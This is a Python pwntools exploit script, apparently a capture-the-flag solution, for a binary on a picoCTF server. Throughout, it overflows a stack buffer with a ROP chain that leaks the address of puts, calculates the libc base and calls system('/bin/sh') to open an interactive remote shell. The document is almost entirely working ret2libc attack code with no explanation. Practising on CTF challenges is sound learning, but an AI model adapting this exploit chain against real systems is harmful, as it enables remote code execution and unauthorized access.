#!/usr/bin/env python3

from pwn import *

binary = './vuln'
#io = process(binary)
io = remote('mercury.picoctf.net',1774)
elf = context.binary = ELF(binary,checksec=False)
context.log_level = 'debug'

#Binary enumeration
rsp_offset = 136
pop_rdi = 0x400913 
ret = 0x40052e
libc = ELF('libc.so.6')

#Leaking puts address payload
log.info(f'Leaking puts func real address')
leaking_payload = b'a' * 136 + p64(pop_rdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.symbols['main'])

#Triggering payload
io.recvuntil('WeLcOmE To mY EcHo sErVeR!')
io.sendline(leaking_payload)
puts_address = io.recvuntil('WeLcOmE To mY EcHo sErVeR!').split()[1]
puts_address = u64(puts_address.ljust(8,b'\x00'))
log.success(f'Leaked puts real address at: {hex(puts_address)}')

#Calculating libc base address
libc.address = puts_address - libc.symbols['puts']
log.success(f'Calculated Libc base address at: {hex(libc.address)}')

#Creating shell payload
system_address = libc.symbols['system']
bin_sh_address = next(libc.search(b"/bin/sh"))
log.success(f'System address at: {hex(system_address)}')
log.success(f'/bin/sh address at: {hex(bin_sh_address)}')

#Creating the shell payload
log.info('Creating the payload...')
payload = b'a' * rsp_offset + p64(ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendline(payload)
io.recvline()
log.success(f'Interactive shell:')
io.interactive()
